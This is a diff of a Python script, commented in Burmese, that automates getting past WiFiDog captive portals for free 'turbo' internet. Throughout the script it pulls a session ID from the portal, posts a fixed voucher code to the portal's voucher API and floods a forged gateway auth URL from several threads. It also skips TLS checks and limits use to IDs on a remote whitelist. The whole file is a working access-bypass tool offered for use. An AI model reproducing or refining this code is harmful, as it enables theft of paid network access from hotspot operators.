@@ -5,6 +5,7 @@ import time
 import threading
 import os
 import sys
+import psutil # <--- Live Usage ကြည့်ရန်လိုအပ်ပါသည်
 from urllib.parse import urlparse, parse_qs, urljoin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -14,43 +15,31 @@ WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/m
 PING_THREADS = 5
 PING_INTERVAL = 0.1 
 
-def clear_screen():
-    os.system('clear' if os.name == 'posix' else 'cls')
-
-def show_banner():
-    clear_screen()
-    banner = """
-    \033[1;32m
-    ##########################################
-    #                                        #
-    #              SWT  TURBO                #
-    #        FAST & UNLIMITED ACCESS         #
-    #                                        #
-    ##########################################
-    \033[0m
-    """
-    print(banner)
+def get_data_usage():
+    """လက်ရှိ အသုံးပြုနေတဲ့ Total Data Usage (MB) ကို တွက်ချက်ရန်"""
+    try:
+        net_io = psutil.net_io_counters()
+        total_bytes = net_io.bytes_sent + net_io.bytes_recv
+        return total_bytes / (1024 * 1024)
+    except: return 0
 
 def check_approval():
     """Device ID ကို keys.txt နဲ့ တိုက်စစ်ခြင်း"""
     try:
-        # User ID ကို တိကျစွာယူခြင်း
         device_id = os.popen("id -u -n").read().strip()
-        print(f"\033[1;33m[*] Detected ID: {device_id}\033[0m")
-        print("[*] Checking Authorization...")
+        print(f"[*] Checking Approval for: {device_id}...")
         
-        # Cache ကိုကျော်ပြီး URL အသစ်ကို ချက်ချင်းယူရန် headers ထည့်ခြင်း
         headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
         response = requests.get(WHITELIST_URL, headers=headers, timeout=10)
         
         allowed_users = response.text.splitlines()
         
         if device_id in allowed_users:
-            print("\033[1;32m[+] Access Granted!\033[0m")
+            print("[+] Access Granted!")
             time.sleep(1)
             return True
         else:
-            print(f"\n\033[1;31m[!] Access Denied! ID: {device_id} is not registered.\033[0m")
+            print(f"\n[!] Access Denied! ID: {device_id} is not registered.")
             print("[*] Contact Admin to get approval.")
             sys.exit()
     except Exception as e:
@@ -62,82 +51,93 @@ def check_real_internet():
         return requests.get("http://www.google.com", timeout=3).status_code == 200
     except: return False
 
-def high_speed_ping(auth_link, session):
+def high_speed_ping(auth_link, session, sid):
     """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
     while True:
         try:
-            session.get(auth_link, timeout=5)
+            res = session.get(auth_link, timeout=5)
+            # ဒီနေရာမှာ Live Status ပြသည်
+            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
         except: break
         time.sleep(PING_INTERVAL)
 
 def start_process():
-    # ၁။ Approval စစ်ဆေးခြင်း (Menu မပေါ်ခင်)
-    show_banner()
+    # Approval စစ်ဆေးခြင်း
     check_approval()
     
-    # ၂။ User Menu ပြသခြင်း
-    print("\n\033[1;33m[1] Start SWT Turbo Internet")
-    print("[0] Exit\033[0m")
+    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
     
+    # 1 နှိပ်ခိုင်းသည့် menu
+    print("\n[1] Start Internet Access")
+    print("[0] Exit")
     choice = input("\nSelect Option: ")
     if choice != '1':
         print("Exiting...")
         sys.exit()
+        
+    start_time = time.time()
+    start_data = get_data_usage()
 
-    clear_screen()
-    show_banner()
-    print("[*] Initializing system... Connecting to Gateway...")
-    
-    # ၃။ အင်တာနက်ချိတ်ဆက်ခြင်း လုပ်ငန်းစဉ်
     while True:
         session = requests.Session()
         test_url = "http://connectivitycheck.gstatic.com/generate_204"
         
         try:
             r = requests.get(test_url, allow_redirects=True, timeout=5)
+            if r.url == test_url:
+                if check_real_internet():
+                    # Live Time and Data Usage
+                    elapsed = time.time() - start_time
+                    mins, secs = divmod(int(elapsed), 60)
+                    hours, mins = divmod(mins, 60)
+                    current_data = get_data_usage() - start_data
+                    print(f"[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Status: OK   ", end='\r')
+                    time.sleep(5)
+                    continue
             
-            # အင်တာနက်ရနေရင် ဆက်စောင့်
-            if r.url == test_url and check_real_internet():
-                print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Running...           ", end='\r')
-                time.sleep(5)
-                continue
-            
-            # Captive Portal ရှာဖွေခြင်း
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
             
+            # ၁။ SID ရှာဖွေခြင်း
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
             r2 = session.get(next_url, verify=False, timeout=10)
             
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
             
             if sid:
-                # Voucher Activation
+                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
+                print(f"\n[*] Activating Session with Voucher API...")
                 voucher_api = f"{portal_host}/api/auth/voucher/"
                 try:
-                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                    # accessCode နေရာတွင် 123456 အပြင် လိုအပ်ပါက ပြောင်းလဲနိုင်သည်
+                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                    print(f"[+] Voucher API Response: {v_res.status_code}")
                 except:
-                    pass
+                    print("[!] Voucher API Failed (Gateway might not require it)")
 
-                # Gateway Authentication
+                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                 params = parse_qs(parsed_portal.query)
                 gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                 gw_port = params.get('gw_port', ['2060'])[0]
                 auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
 
-                # Turbo Pinging Threads
+                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")
+
                 for _ in range(PING_THREADS):
-                    threading.Thread(target=high_speed_ping, args=(auth_link, session), daemon=True).start()
+                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
 
-                print(f"\n\033[1;32m[+] SID: {sid} Activated. Enjoy!\033[0m")
-                while check_real_internet(): time.sleep(5)
+                while check_real_internet():
+                    time.sleep(5)
 
-        except:
-            time.sleep(2)
+        except Exception as e:
+            time.sleep(5)
 
 if __name__ == "__main__":
     start_process()
-
+    
